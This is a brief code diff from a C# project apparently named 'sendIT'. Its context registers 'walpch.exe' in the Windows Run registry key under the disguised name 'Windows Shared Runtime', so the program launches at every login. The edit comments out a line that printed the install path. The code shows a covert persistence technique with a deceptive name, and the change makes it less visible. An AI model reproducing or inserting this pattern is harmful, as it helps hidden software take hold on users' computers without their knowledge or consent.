@@ -171,7 +171,7 @@ namespace sendIT
         {
             Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             key.SetValue("Windows Shared Runtime", path + @"walpch.exe");
-            Console.WriteLine(path);
+            //Console.WriteLine(path);
             key.Close();
         }
 
